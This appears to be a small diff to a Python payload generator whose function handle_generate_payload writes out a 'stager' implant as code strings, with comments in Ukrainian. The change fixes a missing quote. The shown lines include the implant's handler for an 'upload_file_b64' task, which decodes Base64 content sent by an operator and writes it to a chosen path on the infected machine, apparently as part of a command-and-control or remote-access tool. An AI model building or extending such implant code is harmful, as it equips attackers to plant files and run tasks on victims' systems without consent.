@@ -1043,7 +1043,7 @@ def handle_generate_payload():
             "                                task_success = False",
             # --- Нові завдання для завантаження/вивантаження ---
             "                        elif task_type == 'upload_file_b64':", # Обробка завдання завантаження файлу (Base64)
-            "                            upload_params = json_stager_module.loads(task_params_str) # Очікуємо JSON рядок з 'path' та 'content_b64'
+            "                            upload_params = json_stager_module.loads(task_params_str) # Очікуємо JSON рядок з 'path' та 'content_b64'",
             "                            remote_upload_path = upload_params.get('path')",
             "                            file_content_b64 = upload_params.get('content_b64')",
             "                            if remote_upload_path and file_content_b64:",
